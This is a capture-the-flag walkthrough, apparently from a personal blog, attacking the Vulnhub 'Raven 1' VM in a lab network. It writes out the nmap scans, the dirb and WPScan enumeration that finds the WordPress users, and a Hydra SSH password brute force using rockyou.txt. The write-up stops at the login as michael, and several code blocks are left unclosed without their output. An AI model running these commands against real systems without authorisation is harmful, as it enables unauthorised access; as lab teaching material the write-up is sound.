Raven is a blah blah blah

VM can be downloaded at [Vulnhub](https://www.vulnhub.com/entry/raven-1,256/).

## My Setup
I'll be attacking this in Kali Linux from VirtualBox on Windows. As with all the other CTFs I've done, they're on a shared NATNetwork with Kali.

**IP Range:** The IP range I have set for the NATNetwork is 10.0.2.0/24.

## VM Discovery
Nmap's ping scan is my goto for this.

```bash
root@kali:~# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:46 EST
...
MAC Address: 08:00:27:7F:98:2D (Oracle VirtualBox virtual NIC)
Nmap scan report for raven.local (10.0.2.9)
Host is up (0.00011s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.21 seconds
```

## Port Scan
I really ought to automate this.

```bash
root@kali:~# nmap -p- -sV -T4 -sS 10.0.2.9
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 12:01 EST
Nmap scan report for raven.local (10.0.2.9)
Host is up (0.000090s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
```

Nothing much to go off here, so let's check out that Apache server.

## Coming into Port (80)
Busting out the directory buster one more time.
```bash
root@kali:~# dirb http://10.0.2.9

They have a nifty website (with a LOT of javascript). There's a wordpress install on /wordpress.

## Set phasers to WPScan
Enumerate, enumerate, use -e.

I ran into issues using the direct IP, as it seems wordpress depends on the hostname being used. I added the VM's IP to my hosts file as 'raven.local' and was able to continue.

```bash
root@kali:~# wpscan --url http://raven.local/wordpress -e

Perhaps the most interesting results are the two users: michael and steven.
I thought to use WPScan to do a password brute-force attack using the rockyou.txt wordlist, but it proved too slow.
Only thing I know to do at this point is try to SSH with those two users.

But, we have no passwords, only wordlists. Enter Hydra.

```bash
root@kali:~# hydra -l michael -P /usr/share/wordlists/rockyou.txt -t 6 ssh://10.0.2.9

Top tier password choice right there.

Let's login as michael and see what we can do.
